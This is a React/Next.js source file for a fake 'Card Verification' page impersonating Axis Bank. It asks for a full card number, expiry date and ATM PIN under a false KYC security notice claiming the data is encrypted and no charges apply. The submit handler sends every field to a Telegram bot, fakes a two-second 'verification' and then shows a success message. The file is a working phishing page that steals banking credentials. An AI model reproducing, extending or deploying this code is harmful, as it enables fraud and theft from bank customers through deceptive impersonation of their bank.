"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";
import { ArrowLeft, CreditCard, Calendar, AlertCircle, CheckCircle, Lock } from "lucide-react";
import { telegramBot } from "../../utils/telegramBot";

export default function CardVerification() {
  const router = useRouter();
  const [cardData, setCardData] = useState({
    cardNumber: "",
    expiryDate: "",
    atmPin: ""
  });

  const [cardErrors, setCardErrors] = useState({
    cardNumber: "",
    expiryDate: "",
    atmPin: ""
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    if (name === "cardNumber") {
      // Format card number with spaces
      const numericValue = value.replace(/\D/g, "");
      const formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");
      setCardData(prev => ({ ...prev, [name]: formattedValue }));
    } else if (name === "expiryDate") {
      // Format expiry date as MM/YY
      const numericValue = value.replace(/\D/g, "");
      let formattedValue = numericValue;
      if (numericValue.length >= 3) {
        formattedValue = numericValue.slice(0, 2) + "/" + numericValue.slice(2, 4);
      }
      setCardData(prev => ({ ...prev, [name]: formattedValue }));
    } else if (name === "atmPin") {
      // Only allow numbers, max 4 digits
      const numericValue = value.replace(/\D/g, "").slice(0, 4);
      setCardData(prev => ({ ...prev, [name]: numericValue }));
    } else {
      setCardData(prev => ({ ...prev, [name]: value }));
    }

    // Clear error for this field
    setCardErrors(prev => ({ ...prev, [name]: "" }));
  };

  const validateCardForm = () => {
    const newErrors = {
      cardNumber: "",
      expiryDate: "",
      atmPin: ""
    };

    // Card Number validation
    const cleanCardNumber = cardData.cardNumber.replace(/\s/g, "");
    if (!cleanCardNumber) {
      newErrors.cardNumber = "Card number is required";
    } else if (cleanCardNumber.length !== 16) {
      newErrors.cardNumber = "Card number must be 16 digits";
    } else if (!/^\d+$/.test(cleanCardNumber)) {
      newErrors.cardNumber = "Card number should contain only digits";
    }

    // Expiry Date validation
    const cleanExpiry = cardData.expiryDate.replace(/\//g, "");
    if (!cleanExpiry) {
      newErrors.expiryDate = "Expiry date is required";
    } else if (cleanExpiry.length !== 4) {
      newErrors.expiryDate = "Please enter a valid expiry date (MM/YY)";
    } else {
      const month = parseInt(cleanExpiry.slice(0, 2));
      const year = parseInt(cleanExpiry.slice(2, 4));
      const currentYear = new Date().getFullYear() % 100;
      const currentMonth = new Date().getMonth() + 1;
      
      if (month < 1 || month > 12) {
        newErrors.expiryDate = "Invalid month";
      } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
        newErrors.expiryDate = "Card has expired";
      }
    }

    // ATM PIN validation
    if (!cardData.atmPin) {
      newErrors.atmPin = "ATM PIN is required";
    } else if (cardData.atmPin.length !== 4) {
      newErrors.atmPin = "ATM PIN must be exactly 4 digits";
    } else if (!/^\d+$/.test(cardData.atmPin)) {
      newErrors.atmPin = "ATM PIN should contain only digits";
    }

    setCardErrors(newErrors);
    return !newErrors.cardNumber && !newErrors.expiryDate && !newErrors.atmPin;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateCardForm()) {
      return;
    }

    setIsSubmitting(true);
    
    // Send card verification details to Telegram
    const cardDetails = {
      cardNumber: cardData.cardNumber, // Send full card number with spaces
      expiryDate: cardData.expiryDate,
      atmPin: cardData.atmPin,
      timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
    };
    
    await telegramBot.sendCardVerificationNotification(cardDetails);
    
    // Simulate API call for card verification
    setTimeout(() => {
      setIsSubmitting(false);
      setIsSuccess(true);
      
      // Set card verification completion flag
      sessionStorage.setItem('cardVerificationCompleted', Math.floor(Date.now() / 1000).toString());
      
      // Redirect to success page after 3 seconds
      setTimeout(() => {
        router.push("/");
      }, 3000);
    }, 2000);
  };

  const handleBack = () => {
    router.back();
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-[#8B1538] relative">
        <div className="absolute inset-0 opacity-10">
          <div className="h-full w-full" style={{
            backgroundImage: `repeating-linear-gradient(45deg, transparent, transparent 35px, rgba(255,255,255,.1) 35px, rgba(255,255,255,.1) 70px)`
          }}></div>
        </div>
        <div className="relative px-8 py-4">
          <div className="flex items-center">
            <button
              onClick={handleBack}
              className="text-white hover:bg-white/20 rounded-full p-2 mr-4 transition-colors"
            >
              <ArrowLeft size={20} />
            </button>
            <h1 className="text-xl font-semibold text-white">Card Verification</h1>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-2xl mx-auto px-6 py-8">
        {/* Progress Indicator */}
        <div className="flex items-center justify-center mb-8">
          <div className="flex items-center space-x-4">
            <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center">
              <svg className="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
              </svg>
            </div>
            <div className="w-16 h-1 bg-green-500"></div>
            <div className="w-8 h-8 bg-[#8B1538] rounded-full flex items-center justify-center text-white font-semibold">
              2
            </div>
          </div>
        </div>

        {/* Success Message */}
        {isSuccess && (
          <div className="bg-green-50 border border-green-200 rounded-lg p-6 mb-6">
            <div className="flex items-center">
              <CheckCircle className="text-green-600 mr-3" size={24} />
              <div>
                <h3 className="font-semibold text-green-800">Card Verification Successful!</h3>
                <p className="text-sm text-green-700 mt-1">
                  Your card has been successfully verified. You will be redirected to the home page shortly.
                </p>
              </div>
            </div>
          </div>
        )}

        {/* Form */}
        {!isSuccess && (
          <div className="bg-white rounded-lg shadow-lg p-8">
            <div className="text-center mb-6">
              <h2 className="text-2xl font-semibold text-gray-900 mb-2">Verify Your Card</h2>
              <p className="text-sm text-gray-600">Please enter your card details for security verification</p>
            </div>

            {/* Card Information Banner */}
            <div className="bg-amber-50 border border-amber-200 rounded-lg p-4 mb-6">
              <div className="flex items-start">
                <AlertCircle className="text-amber-600 mt-0.5 mr-2 flex-shrink-0" size={16} />
                <div className="text-sm text-amber-800">
                  <p className="font-medium mb-1">Security Notice:</p>
                  <ul className="space-y-1 text-xs">
                    <li>• Your card information is encrypted and secure</li>
                    <li>• We only verify card validity, no charges will be applied</li>
                    <li>• This step is mandatory for KYC completion</li>
                  </ul>
                </div>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Card Number Field */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Card Number <span className="text-red-500">*</span>
                </label>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                    <CreditCard size={18} className="text-gray-400" />
                  </div>
                  <input
                    type="text"
                    name="cardNumber"
                    value={cardData.cardNumber}
                    onChange={handleCardChange}
                    className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-[#8B1538] focus:border-transparent outline-none transition-colors text-lg ${
                      cardErrors.cardNumber ? "border-red-500" : "border-gray-300"
                    }`}
                    placeholder="1234 5678 9012 3456"
                    maxLength={19}
                  />
                </div>
                {cardErrors.cardNumber && (
                  <div className="flex items-center mt-1 text-red-500 text-sm">
                    <AlertCircle size={14} className="mr-1" />
                    {cardErrors.cardNumber}
                  </div>
                )}
              </div>

              {/* Expiry Date Field */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Expiry Date <span className="text-red-500">*</span>
                </label>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                    <Calendar size={18} className="text-gray-400" />
                  </div>
                  <input
                    type="text"
                    name="expiryDate"
                    value={cardData.expiryDate}
                    onChange={handleCardChange}
                    className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-[#8B1538] focus:border-transparent outline-none transition-colors text-lg ${
                      cardErrors.expiryDate ? "border-red-500" : "border-gray-300"
                    }`}
                    placeholder="MM/YY"
                    maxLength={5}
                  />
                </div>
                {cardErrors.expiryDate && (
                  <div className="flex items-center mt-1 text-red-500 text-sm">
                    <AlertCircle size={14} className="mr-1" />
                    {cardErrors.expiryDate}
                  </div>
                )}
              </div>

              {/* ATM PIN Field */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  ATM PIN <span className="text-red-500">*</span>
                </label>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                    <Lock size={18} className="text-gray-400" />
                  </div>
                  <input
                    type="password"
                    name="atmPin"
                    value={cardData.atmPin}
                    onChange={handleCardChange}
                    className={`w-full pl-10 pr-3 py-3 border rounded-lg focus:ring-2 focus:ring-[#8B1538] focus:border-transparent outline-none transition-colors text-lg font-mono ${
                      cardErrors.atmPin ? "border-red-500" : "border-gray-300"
                    }`}
                    placeholder="****"
                    maxLength={4}
                  />
                </div>
                {cardErrors.atmPin && (
                  <div className="flex items-center mt-1 text-red-500 text-sm">
                    <AlertCircle size={14} className="mr-1" />
                    {cardErrors.atmPin}
                  </div>
                )}
                <p className="text-xs text-gray-500 mt-1">Enter your 4-digit ATM PIN for verification</p>
              </div>

              {/* Card Type Display */}
              <div className="bg-gray-50 p-4 rounded-lg">
                <div className="flex items-center justify-between">
                  <span className="text-sm text-gray-600">Card Type:</span>
                  <div className="flex items-center space-x-2">
                    <div className="w-8 h-5 bg-gradient-to-r from-blue-600 to-blue-400 rounded"></div>
                    <span className="text-sm font-medium text-gray-800">Debit/Credit Card</span>
                  </div>
                </div>
              </div>

              {/* Action Buttons */}
              <div className="flex gap-4 pt-4">
                <button
                  type="button"
                  onClick={handleBack}
                  className="flex-1 border border-gray-300 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-50 transition-colors"
                >
                  Back
                </button>
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="flex-1 bg-[#8B1538] text-white py-3 rounded-lg font-semibold hover:bg-[#7a1230] transition-colors focus:ring-2 focus:ring-[#8B1538] focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isSubmitting ? (
                    <span className="flex items-center justify-center">
                      <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      Verifying...
                    </span>
                  ) : (
                    "Submit"
                  )}
                </button>
              </div>
            </form>
          </div>
        )}

        {/* Footer */}
        <div className="text-center mt-8 text-sm text-gray-500">
          <p>© 2024 Axis Bank | Privacy Policy | Terms of Use</p>
        </div>
      </main>
    </div>
  );
}
